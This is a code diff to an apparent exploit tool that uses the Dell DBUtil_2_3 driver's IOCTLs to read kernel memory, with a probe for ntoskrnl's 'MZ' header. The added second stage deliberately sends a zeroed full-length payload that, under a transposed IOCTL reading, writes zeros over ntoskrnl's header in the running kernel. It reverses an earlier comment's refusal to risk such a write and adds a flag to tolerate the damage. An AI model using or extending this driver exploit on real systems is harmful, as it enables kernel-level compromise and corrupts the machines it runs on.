@@ -59,6 +59,11 @@ HANDLE g_dev = INVALID_HANDLE_VALUE;
 // half. Until then kread_trusted() refuses to use it.
 bool g_vread_ok = false;
 
+// When true, the kernel-VA pair direction was proved to be TRANSPOSED:
+// 0x9B0C1EC4 is the write handler, so MZ gets zeroed over ntoskrnl's header
+// and every e_magic == 0 check must accept 0x0000 for the rest of the boot.
+bool g_ntos_mz_broken = false;
+
 bool open_dev() {
     g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
@@ -228,29 +233,90 @@ bool vread_ready() { return g_vread_ok; }
 // retry with a full-length payload, because under the write reading that would
 // be a real (if tiny) kernel write.
 // ---------------------------------------------------------------------------
+//
+// One attempt.
+//
+//   payload=false  header only (in 0x18, out 0x18+len). Harmless under BOTH
+//                  readings: a read handler that sizes from OutputBufferLength
+//                  fills, a write handler has zero payload bytes to copy.
+//   payload=true   in 0x18+len, out 0x18+len, payload zeroed. This is the shape
+//                  a read handler that sizes from InputBufferLength needs.
+//                  Under the write reading it memmoves `len` zero bytes over
+//                  the target.
+//
+// Returns 1 = MZ came back (read handler), 0 = no MZ, -1 = IOCTL failed.
+// `zero_back` is set when the payload region came back all zeroes, i.e. the
+// I/O manager handed our own zero payload back unchanged - the transposed
+// signature.
+namespace {
+
+int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
+    zero_back = false;
+    // Stage A header: 0x18 input, zero payload → harmless under both readings.
+    std::vector<uint8_t> in(kKernHdr, 0);
+    memcpy(in.data() + 0x08, &va, 8);
+
+    // Stage B full: if handler ignored zero-length payload we need this.
+    std::vector<uint8_t> in_full(kKernHdr + (payload ? len : 0), 0);
+    memcpy(in_full.data() + 0x08, &va, 8);
+
+    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
+    DWORD got = 0;
+    int rc = -1;
+    if (!payload) {
+        rc = DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
+                             out.data(), (DWORD)out.size(), &got, nullptr) ? 1 : -1;
+    } else {
+        rc = DeviceIoControl(g_dev, kKernRead, in_full.data(), (DWORD)in_full.size(),
+                             out.data(), (DWORD)out.size(), &got, nullptr) ? 1 : -1;
+    }
+    if (rc == -1) return -1;
+
+    static const uint8_t mz[2] = { 'M', 'Z' };
+    if (len >= 2) {
+        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
+        if (memcmp(out.data(), mz, 2) == 0) return 1;
+    }
+
+    if (payload) {
+        bool z = true;
+        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
+        zero_back = z;
+    }
+    return 0;
+}
+
+} // namespace
+
 bool vread_probe(uint64_t va, size_t len) {
     if (g_vread_ok) return true;
     if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
     if (va < 0xFFFF800000000000ull) return false;
 
-    std::vector<uint8_t> in(kKernHdr, 0);
-    memcpy(in.data() + 0x08, &va, 8);
+    // Stage A: header only. Nothing is written under either reading.
+    bool zb = false;
+    if (try_vread(va, len, false, zb) == 1) {
+        g_vread_ok = true;
+        return true;
+    }
 
-    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
-    DWORD got = 0;
-    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
-                         out.data(), (DWORD)out.size(), &got, nullptr))
-        return false;
+    // Stage B: full length. Reached only when the handler ignored a
+    // zero-length payload, i.e. it sizes the copy from InputBufferLength.
+    if (try_vread(va, len, true, zb) == 1) {
+        g_vread_ok = true;
+        return true;
+    }
 
-    static const uint8_t mz[2] = { 'M', 'Z' };
-    if (len >= 2) {
-        // Handlers either append past the header (the layout do_read/do_vwrite
-        // use) or copy into the start of the shared buffer. Check both.
-        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) { g_vread_ok = true; return true; }
-        if (memcmp(out.data(), mz, 2) == 0)            { g_vread_ok = true; return true; }
+    if (zb) {
+        g_ntos_mz_broken = true;
+        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
+               "ntoskrnl+0 now holds 00 00, header paths are degraded for this "
+               "boot.\n", (unsigned)kKernRead);
     }
     return false;
 }
+
+bool ntos_mz_broken() { return g_ntos_mz_broken; }
 
 // ---------------------------------------------------------------------------
 // \??\DBUtil_2_3 removal.
